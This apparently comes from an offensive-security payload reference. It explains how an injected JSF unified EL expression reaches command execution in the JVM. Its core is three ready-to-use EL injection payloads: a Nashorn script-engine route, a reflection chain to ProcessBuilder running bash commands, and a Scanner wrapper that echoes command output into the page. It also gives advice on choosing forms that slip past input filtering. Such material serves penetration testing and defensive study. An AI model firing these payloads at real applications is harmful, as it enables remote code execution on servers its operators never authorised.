---
title: "JSF EL code execution: reflection to ProcessBuilder through unified EL"
description: "JSF unified EL from 2.2 onward invokes methods, so an injected #{...} expression reaches reflection, a script engine, or ProcessBuilder to run commands inside the JVM."
keywords:
  - JSF EL code execution
  - unified EL method invocation
  - ScriptEngineManager EL
  - ProcessBuilder reflection
  - EL RCE
---

# Code execution

Unified EL in JSF reached method invocation with the 2.2 revision, and EL 3.0 added it to the core grammar. Once an expression can call methods, a value starts a reflection chain: from any object it reaches `getClass()`, from there `Class.forName(...)` loads an arbitrary type, and from the loaded type the expression constructs objects and calls methods. That is the whole path to the host runtime. The chain matters because EL cannot write an `import` or a `new` on a fully qualified name the way MVEL can, so types are reached through reflection rather than named directly.

## Script engine route

The shortest path runs a scripting language through `javax.script`. A string literal yields a `String`, `getClass()` gives its `Class`, and `forName` loads the `ScriptEngineManager`; its `getEngineByName('js')` returns a Nashorn engine whose `eval` runs arbitrary Java through JavaScript:

```jsp
#{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('java.lang.Runtime.getRuntime().exec("id")')}
```

`newInstance()` works because `ScriptEngineManager` has a public no-argument constructor. Nashorn ships with the JDK through 14, so this route depends on the runtime still bundling it or on the application providing another JSR-223 engine.

## Reflection to ProcessBuilder

Without a script engine, the expression reaches `ProcessBuilder` directly. `ProcessBuilder` exposes a varargs `String...` constructor, so a single declared constructor is instantiated with an argument array and started:

```jsp
#{''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(['/bin/bash','-c','id; uname -a']).start()}
```

Selecting `getDeclaredConstructors()[0]` assumes the first constructor is the `List`/`String[]` form; where the ordering differs, iterate the constructor array and pick the one whose parameter type matches. As with every Java exec sink, `ProcessBuilder` runs the program with no shell, so shell features live inside the `bash -c` argument rather than around it.

## Reading output back

To return command output into the rendered response rather than running blind, wrap the process stream in the same expression:

```jsp
#{''.getClass().forName('java.util.Scanner').getConstructor(''.getClass().forName('java.io.InputStream')).newInstance(''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('id').getInputStream()).useDelimiter('\\A').next()}
```

The `Runtime` reflection form (`getMethod('getRuntime').invoke(null)`) is interchangeable with the `ProcessBuilder` form; pick whichever the filtering in front of the sink leaves intact.

## References

- [Jakarta Expression Language Specification](https://jakarta.ee/specifications/expression-language/)
- [PayloadsAllTheThings: Java EL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Java)
